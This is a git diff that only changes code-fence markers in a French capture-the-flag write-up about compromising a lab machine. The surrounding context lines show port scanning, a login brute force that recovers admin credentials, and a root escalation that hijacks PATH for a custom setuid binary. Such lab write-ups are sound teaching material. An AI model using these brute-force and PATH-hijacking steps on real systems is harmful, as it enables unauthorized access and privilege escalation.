@@ -10,7 +10,7 @@ Il n'en fallait pas plus pour attirer ma curiosité.
 1 2 3 4 je me connecte en admin
 -------------------------------
 
-```plain
+```
 Nmap scan report for 192.168.2.3
 Host is up (0.00054s latency).
 Not shown: 65533 closed ports
@@ -39,7 +39,7 @@ Le scan n'a rien de bien original. On se retrouve vite sur l'appli web PHP à l'
 
 J'en profite pour lancer un buster afin de trouver d'autres scripts éventuels :  
 
-```plain
+```
 [*] Launching module buster
 Found webpage http://192.168.2.3/test2/css
 Found webpage http://192.168.2.3/test2/js
@@ -59,7 +59,7 @@ Found webpage http://192.168.2.3/test2/validate.php
 
 J'aime bien jeter un coup d’œil aux entêtes des scripts de déconnexion car ils sont parfois verbeux sur les cookies qu'ils suppriment (quand bien même les cookies n'ont pas été créés auparavant):   
 
-```plain
+```
 $ curl -D- http://192.168.2.3/test2/logout.php
 HTTP/1.1 302 Found
 Date: Sun, 11 Mar 2018 15:05:15 GMT
@@ -79,7 +79,7 @@ Ici ça paye car on voit deux clés user et pass. Malgré cela ils ne semblent p
 
 Le script d'export nous retourne vraisemblablement la page de profil de l'utilisateur *admin* au format PDF :  
 
-```plain
+```
 $ curl -D- http://192.168.2.3/test2/export.php
 HTTP/1.1 200 OK
 Date: Sun, 11 Mar 2018 15:05:57 GMT
@@ -150,7 +150,7 @@ with open(USER_FILE) as fd:
 
 Je met quelques noms d'utilisateurs (guest, demo, admin, test, etc) dans une wordlist et la pèche se termine aussitôt :  
 
-```plain
+```
 $ python3 brute.py users.txt /opt/wordlists/top500.txt
 No fail login message with creds admin / 1234
 ```
@@ -204,13 +204,13 @@ Le serveur Apache tourne avec le user *gemini1* (via l'entrée *export APACHE\_R
 
 Finalement après avoir listé les binaires setuid pour la seconde fois il y en a un qui me fait plus tilter que les autres (j'ai d'abord pensé à un programme lié à Exim) :  
 
-```plain
+```
 -rwsr-xr-x 1 root root 8792 Jan  7 06:10 /usr/bin/listinfo
 ```
 
 Effectivement le binaire semble être fait maison :  
 
-```plain
+```
 gemini1@geminiinc:/var/www$ /usr/bin/listinfo
 displaying network information...            inet 192.168.2.3  netmask 255.255.255.0  broadcast 192.168.2.255
 displaying network information...            inet6 fe80::a00:27ff:fe65:aaca  prefixlen 64  scopeid 0x20<link>
@@ -228,7 +228,7 @@ displaying current date...    Sun Mar 11 20:35:42 EDT 2018
 
 Un appel à strings suffira à voir que certains programmes (date, grep) ne sont pas appelés via leurs paths complet :  
 
-```plain
+```
 /sbin/ifconfig | grep inet
 /bin/netstat -tuln | grep 22
 /bin/netstat -tuln | grep 80
@@ -257,7 +257,7 @@ int main(void)
 
 Compile, exécute et profite :  
 
-```plain
+```
 gemini1@geminiinc:/tmp$ gcc -o date date.c 
 gemini1@geminiinc:/tmp$ PATH=.:$PATH /usr/bin/listinfo
 displaying network information...            inet 192.168.2.3  netmask 255.255.255.0  broadcast 192.168.2.255
